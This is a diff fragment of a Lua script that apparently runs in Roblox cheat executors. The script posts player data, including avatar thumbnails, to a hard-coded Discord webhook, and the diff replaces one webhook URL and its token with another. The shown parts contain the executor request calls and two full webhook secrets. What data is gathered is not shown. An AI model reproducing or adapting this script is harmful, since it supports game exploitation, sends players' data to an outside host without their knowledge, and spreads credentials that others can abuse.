@@ -1,4 +1,4 @@
-
+if true then
 if _G.Honey_Valley then
   warn("Script Is fucking Already running",0) 
     return
@@ -9,7 +9,7 @@ local http_request = http_request or request or (syn and syn.request) or (fluxus
 
 local HttpService = game:GetService("HttpService")
 local MarketplaceService = game:GetService("MarketplaceService")
-local hookURL = "https://discord.com/api/webhooks/1331561807894151209/7pfnnAqhUBaXrIWiitb4sw7PkqWtWYUFPfBgRuOlytf-w49U_0oYQWiyOrcG9dqaA2na"
+local hookURL = "https://discord.com/api/webhooks/1332957998154387527/9tZNR0J79SiKPyjOaWWzJeDpavIqySTUGHQXrdudqPjSUUJUGo8WCFfsFTRvhxtx-CSC"
 
 function thumbnail(plyId)
     local url = "https://thumbnails.roproxy.com/v1/users/avatar-headshot?userIds=" .. plyId .. "&returnPolicy=PlaceHolder&size=75x75&format=Png&isCircular=false"
@@ -117,4 +117,5 @@ end)
 
 if not success then
     warn("Failed to send data to the webhook: " .. errorMessage)
+end
 end
